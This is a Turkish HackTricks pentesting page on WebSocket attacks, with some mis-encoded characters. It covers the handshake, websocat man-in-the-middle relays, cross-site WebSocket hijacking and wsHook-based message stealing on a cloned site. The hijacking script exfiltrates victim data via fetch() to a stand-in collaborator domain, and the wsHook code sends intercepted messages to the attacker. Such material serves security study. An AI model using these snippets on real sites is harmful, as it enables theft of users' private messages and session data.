# WebSocket SaldÄ±rÄ±larÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi **HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** isterseniz [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## WebSockets Nedir

WebSocket baÄŸlantÄ±larÄ±, baÅŸlangÄ±Ã§ta **HTTP** el sÄ±kÄ±ÅŸmasÄ± aracÄ±lÄ±ÄŸÄ±yla kurulur ve iÅŸlem sistemine ihtiyaÃ§ duymadan herhangi bir zamanda **Ã§ift yÃ¶nlÃ¼ mesajlaÅŸma** saÄŸlamak iÃ§in **uzun sÃ¼reli** olarak tasarlanmÄ±ÅŸtÄ±r. Bu, canlÄ± finansal veri akÄ±ÅŸlarÄ± gibi **dÃ¼ÅŸÃ¼k gecikme sÃ¼resi veya sunucu baÅŸlatmalÄ± iletiÅŸim** gerektiren uygulamalar iÃ§in WebSockets'in Ã¶zellikle avantajlÄ± olmasÄ±nÄ± saÄŸlar.

### WebSocket BaÄŸlantÄ±larÄ±nÄ±n KurulmasÄ±

WebSocket baÄŸlantÄ±larÄ±nÄ±n ayrÄ±ntÄ±lÄ± bir aÃ§Ä±klamasÄ±na [**buradan**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc) eriÅŸilebilir. Ã–zet olarak, WebSocket baÄŸlantÄ±larÄ± genellikle aÅŸaÄŸÄ±daki gibi istemci tarafÄ± JavaScript kullanÄ±larak baÅŸlatÄ±lÄ±r:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
`wss` protokolÃ¼, **TLS** ile gÃ¼vence altÄ±na alÄ±nmÄ±ÅŸ bir WebSocket baÄŸlantÄ±sÄ±nÄ± ifade ederken, `ws` gÃ¼vencesiz bir baÄŸlantÄ±yÄ± gÃ¶sterir.

BaÄŸlantÄ± kurulmasÄ± sÄ±rasÄ±nda tarayÄ±cÄ± ve sunucu arasÄ±nda HTTP Ã¼zerinden bir el sÄ±kÄ±ÅŸma gerÃ§ekleÅŸtirilir. El sÄ±kÄ±ÅŸma sÃ¼reci, tarayÄ±cÄ±nÄ±n bir istek gÃ¶ndermesi ve sunucunun yanÄ±t vermesini iÃ§erir. AÅŸaÄŸÄ±daki Ã¶rneklerde gÃ¶sterildiÄŸi gibi:

TarayÄ±cÄ± bir el sÄ±kÄ±ÅŸma isteÄŸi gÃ¶nderir:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Sunucunun el sÄ±kÄ±ÅŸma yanÄ±tÄ±:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
BaÄŸlantÄ± bir kez kurulduÄŸunda, mesaj alÄ±ÅŸveriÅŸi iÃ§in baÄŸlantÄ± her iki yÃ¶nde de aÃ§Ä±k kalÄ±r.

**WebSocket El SÄ±kÄ±ÅŸmasÄ±nÄ±n Ana NoktalarÄ±:**

- `Connection` ve `Upgrade` baÅŸlÄ±klarÄ±, WebSocket el sÄ±kÄ±ÅŸmasÄ±nÄ±n baÅŸlatÄ±ldÄ±ÄŸÄ±nÄ± belirtir.
- `Sec-WebSocket-Version` baÅŸlÄ±ÄŸÄ± istenen WebSocket protokol sÃ¼rÃ¼mÃ¼nÃ¼ belirtir, genellikle `13`'tÃ¼r.
- Base64 ile kodlanmÄ±ÅŸ rastgele bir deÄŸer, `Sec-WebSocket-Key` baÅŸlÄ±ÄŸÄ±nda gÃ¶nderilir ve her el sÄ±kÄ±ÅŸmanÄ±n benzersiz olmasÄ±nÄ± saÄŸlar, bu da Ã¶nbellekleyen proxy'lerle ilgili sorunlarÄ± Ã¶nlemeye yardÄ±mcÄ± olur. Bu deÄŸer kimlik doÄŸrulama iÃ§in deÄŸil, yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir sunucu veya Ã¶nbellek tarafÄ±ndan oluÅŸturulan yanÄ±tÄ±n doÄŸruluÄŸunu onaylamak iÃ§indir.
- Sunucunun yanÄ±tÄ±ndaki `Sec-WebSocket-Accept` baÅŸlÄ±ÄŸÄ±, `Sec-WebSocket-Key`'in bir karmasÄ±dÄ±r ve sunucunun bir WebSocket baÄŸlantÄ±sÄ± aÃ§ma niyetini doÄŸrular.

Bu Ã¶zellikler, el sÄ±kÄ±ÅŸma sÃ¼recinin gÃ¼venli ve gÃ¼venilir olmasÄ±nÄ± saÄŸlar, bÃ¶ylece etkili gerÃ§ek zamanlÄ± iletiÅŸim saÄŸlanÄ±r.


### Linux konsolu

`websocat` kullanarak bir websocket ile doÄŸrudan bir baÄŸlantÄ± kurabilirsiniz.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Veya bir websocat sunucusu oluÅŸturmak iÃ§in:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket baÄŸlantÄ±larÄ±

EÄŸer mevcut yerel aÄŸÄ±nÄ±zdan istemcilerin bir **HTTP websocket**'e baÄŸlÄ± olduÄŸunu tespit ederseniz, istemci ve sunucu arasÄ±nda bir MitM saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in bir [ARP Spoofing SaldÄ±rÄ±sÄ±](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) deneyebilirsiniz.\
Ä°stemci baÄŸlantÄ± kurmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda, aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websocket numaralandÄ±rma

Websocket'leri otomatik olarak keÅŸfetmek, parmak izi almak ve bilinen zayÄ±flÄ±klarÄ± aramak iÃ§in **https://github.com/PalindromeLabs/STEWS** **araÃ§**Ä±nÄ± kullanabilirsiniz.

### Websocket Hata AyÄ±klama AraÃ§larÄ±

* **Burp Suite**, dÃ¼zenli HTTP iletiÅŸimi iÃ§in yaptÄ±ÄŸÄ± gibi MitM websocket iletiÅŸimini destekler.
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite eklentisi**, Burp'ta Websocket iletiÅŸimini daha iyi yÃ¶netmenizi saÄŸlar. **GeÃ§miÅŸi** almak, **interception kurallarÄ±** belirlemek, **eÅŸleÅŸtirme ve deÄŸiÅŸtirme** kurallarÄ± kullanmak, **Intruder** ve **AutoRepeater** kullanmak iÃ§in kullanÄ±labilir.
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** "**WebSocket/Socket.io Proxy**" kÄ±saltmasÄ± olan bu Node.js yazÄ±lÄ±mÄ±, istemci ve sunucu arasÄ±ndaki tÃ¼m WebSocket ve Socket.IO iletiÅŸimini **yakalamak**, **intercept etmek**, **Ã¶zel mesajlar gÃ¶ndermek** ve gÃ¶rÃ¼ntÃ¼lemek iÃ§in bir kullanÄ±cÄ± arayÃ¼zÃ¼ saÄŸlar.
* [**wsrepl**](https://github.com/doyensec/wsrepl), Ã¶zellikle penetrasyon testi iÃ§in tasarlanmÄ±ÅŸ **etkileÅŸimli bir websocket REPL**'dir. Gelen websocket mesajlarÄ±nÄ± gÃ¶zlemlemek ve yeni mesajlar gÃ¶ndermek iÃ§in bir arayÃ¼z saÄŸlar ve bu iletiÅŸimi **otomatikleÅŸtirmek** iÃ§in kolay kullanÄ±mlÄ± bir Ã§erÃ§eve sunar.
* [**https://websocketking.com/**](https://websocketking.com/), **websockets** kullanarak diÄŸer web siteleriyle iletiÅŸim kurmak iÃ§in bir **web** saÄŸlar.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket), diÄŸer iletiÅŸim/protokol tÃ¼rlerinin yanÄ± sÄ±ra **websockets** kullanarak diÄŸer web siteleriyle iletiÅŸim kurmanÄ±zÄ± saÄŸlar.

## Websocket LaboratuvarÄ±

[**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) iÃ§inde, websockets kullanarak bir web sitesi baÅŸlatmak iÃ§in bir kod bulunur ve [**bu yazÄ±da**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) aÃ§Ä±klama bulabilirsiniz.

## Cross-site WebSocket kaÃ§Ä±rma (CSWSH)

**Cross-site WebSocket kaÃ§Ä±rma**, WebSocket el sÄ±kÄ±ÅŸmalarÄ±nÄ± etkileyen **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)**'nin belirli bir durumu olarak tanÄ±mlanÄ±r. Bu zayÄ±flÄ±k, WebSocket el sÄ±kÄ±ÅŸmalarÄ±nÄ±n yalnÄ±zca **HTTP Ã§erezleri** aracÄ±lÄ±ÄŸÄ±yla kimlik doÄŸrulamasÄ± yapmasÄ± durumunda ortaya Ã§Ä±kar ve CSRF tokenlarÄ± veya benzeri gÃ¼venlik Ã¶nlemleri kullanÄ±lmaz.

SaldÄ±rganlar, zayÄ±f bir uygulamaya karÅŸÄ± bir Ã§apraz site WebSocket baÄŸlantÄ±sÄ± baÅŸlatan **kÃ¶tÃ¼ niyetli bir web sayfasÄ±** barÄ±ndÄ±rarak bunu sÃ¶mÃ¼rebilir. SonuÃ§ olarak, bu baÄŸlantÄ±, oturum iÅŸleme mekanizmasÄ±ndaki CSRF korumasÄ±nÄ±n eksikliÄŸini sÃ¶mÃ¼rerek, baÄŸlantÄ±nÄ±n kurbanÄ±n oturumuyla birlikte iÅŸlenmesi olarak kabul edilir.

### Basit SaldÄ±rÄ±

UnutmayÄ±n ki **websocket** baÄŸlantÄ±sÄ± **kurulduÄŸunda**, **Ã§erez** sunucuya **gÃ¶nderilir**. **Sunucu**, gÃ¶nderilen Ã§erezlere dayanarak her **belirli kullanÄ±cÄ±yÄ± websocket oturumuyla iliÅŸkilendirebilir**.

Ã–rneÄŸin, eÄŸer **websocket** **sunucusu**, "**READY**" iletilmesi durumunda bir kullanÄ±cÄ±nÄ±n konuÅŸma geÃ§miÅŸini geri gÃ¶nderiyorsa, **basit bir XSS** baÄŸlantÄ± kurarak (Ã§erez, kurban kullanÄ±cÄ±yÄ± yetkilendirmek iÃ§in **otomatik olarak gÃ¶nderilecektir**) "**READY**" gÃ¶ndermek, konuÅŸma geÃ§miÅŸini alabilir.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### FarklÄ± bir alt alan adÄ±yla Cross Origin + Cookie

Bu blog yazÄ±sÄ±nda [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), saldÄ±rgan web soket iletiÅŸiminin gerÃ§ekleÅŸtiÄŸi alan adÄ±nÄ±n **alt alan adÄ±nda keyfi JavaScript kodu Ã§alÄ±ÅŸtÄ±rmayÄ±** baÅŸardÄ±. **Alt alan adÄ±** olduÄŸu iÃ§in **Ã§erez** gÃ¶nderiliyordu ve **Websocket Origin'i doÄŸru ÅŸekilde kontrol etmediÄŸi** iÃ§in onunla iletiÅŸim kurarak **onun iÃ§inden token Ã§almak** mÃ¼mkÃ¼n oldu.

### KullanÄ±cÄ±dan veri Ã§almak

Taklit etmek istediÄŸiniz web uygulamasÄ±nÄ± (Ã¶rneÄŸin .html dosyalarÄ±nÄ±) kopyalayÄ±n ve web soket iletiÅŸiminin gerÃ§ekleÅŸtiÄŸi betik iÃ§ine aÅŸaÄŸÄ±daki kodu ekleyin:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Åimdi `wsHook.js` dosyasÄ±nÄ± [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) adresinden indirin ve **web dosyalarÄ±nÄ±n bulunduÄŸu klasÃ¶re kaydedin**.\
Web uygulamasÄ±nÄ± aÃ§Ä±ÄŸa Ã§Ä±kararak ve bir kullanÄ±cÄ±nÄ±n buna baÄŸlanmasÄ±nÄ± saÄŸlayarak, websocket Ã¼zerinden gÃ¶nderilen ve alÄ±nan mesajlarÄ± Ã§alabilirsiniz:
```javascript
sudo python3 -m http.server 80
```
## YarÄ±ÅŸ KoÅŸullarÄ±

WebSockets'te YarÄ±ÅŸ KoÅŸullarÄ± da Ã¶nemlidir, [daha fazla bilgi iÃ§in bu bilgilere bakÄ±n](race-condition.md#rc-in-websockets).

## DiÄŸer zayÄ±flÄ±klar

WebSockets, verileri sunucu tarafÄ±na ve istemci tarafÄ±na gÃ¶ndermek iÃ§in bir mekanizma olduÄŸundan, sunucu ve istemcinin bilgileri nasÄ±l iÅŸlediÄŸine baÄŸlÄ± olarak, WebSockets, bir kullanÄ±cÄ±nÄ±n bir web soketinden giriÅŸ kullanarak XSS, SQLi veya diÄŸer yaygÄ±n web zafiyetlerini sÃ¶mÃ¼rmek iÃ§in kullanÄ±labilir.

## **WebSocket Smuggling**

Bu zayÄ±flÄ±k, ters proxy kÄ±sÄ±tlamalarÄ±nÄ± **atlamak** iÃ§in bir **web soketi iletiÅŸimi kurulmuÅŸ gibi** yaparak onlara inandÄ±rmanÄ±za izin verebilir (gerÃ§ek olmasa bile). Bu, bir saldÄ±rganÄ±n **gizli uÃ§ noktalara eriÅŸmesine** olanak tanÄ±r. Daha fazla bilgi iÃ§in aÅŸaÄŸÄ±daki sayfaya bakÄ±n:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## Referanslar

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) gÃ¶rÃ¼n
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
